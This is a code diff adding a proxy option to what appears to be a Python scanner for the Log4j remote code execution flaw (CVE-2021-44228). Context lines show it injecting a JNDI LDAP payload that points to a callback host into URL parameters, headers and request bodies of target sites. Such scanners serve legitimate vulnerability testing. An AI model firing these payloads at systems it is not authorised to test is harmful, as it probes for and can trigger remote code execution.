@@ -63,6 +63,10 @@ parser.add_argument("-u", "--url",
                     dest="url",
                     help="Check a single URL.",
                     action='store')
+parser.add_argument("-p", "--proxy",
+                    dest="proxy",
+                    help="send requests through proxy",
+                    action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
                     help="Check a list of URLs.",
@@ -239,7 +243,7 @@ def parse_url(url):
             "file_path": file_path})
 
 
-def scan_url(url, callback_host):
+def scan_url(url, callback_host, proxies):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
@@ -255,7 +259,8 @@ def scan_url(url, callback_host):
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -268,7 +273,8 @@ def scan_url(url, callback_host):
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -280,7 +286,8 @@ def scan_url(url, callback_host):
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -314,7 +321,10 @@ def main():
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
         cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, dns_callback_host)
+        proxies = {}
+        if args.proxy:
+            proxies = {"http": args.proxy, "https": args.proxy}
+        scan_url(url, dns_callback_host, proxies)
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
